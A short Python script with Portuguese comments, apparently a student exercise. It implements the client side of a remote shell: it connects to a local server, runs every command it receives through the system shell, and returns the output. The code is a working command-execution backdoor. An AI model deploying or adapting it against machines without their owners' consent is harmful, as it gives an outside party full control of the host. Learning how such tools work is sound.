# 1. Quando se conecta ao servidor deve esperar pela msg
#em loop infinito

# 2. Quando receber a mesnagem deve printar o comando a ser executado

# 3. [Popen] Comando deve ser executado, e output (concatenar stdout com stderr)
# deve ser enviado para o servidor

import socket
import subprocess

HEADER = 64
PORT = 5050
FORMAT_UTF = "utf-8"
FORMAT_WINDOWS = "cp1252"
SERVER = "localhost"
ADDR = (SERVER, PORT)

def send(msg):
  msg_length = len(msg)
  send_length = str(msg_length).encode(FORMAT_UTF)
  # header - formato padrao de 64 bytes
  send_length += b' ' * (HEADER - len(send_length))
  client.sendall(send_length)
  # manda a msg em si 
  client.sendall(msg)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

while True:
  command = client.recv(1024).decode(FORMAT_UTF)
  print(f"command: \"{command}\"")
  if command:
    # o andre colocou esse codigo lah no e-disciplinas entao acho que nao precisa concatenar
    # com o stderr
    #output = subprocess.run(command, shell=True, capture_output=True).stdout
    # acho que esse jeito debaixo eh melhor
    pipe = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = pipe.communicate()[0]
    print(output.decode(FORMAT_WINDOWS))
    send(output)






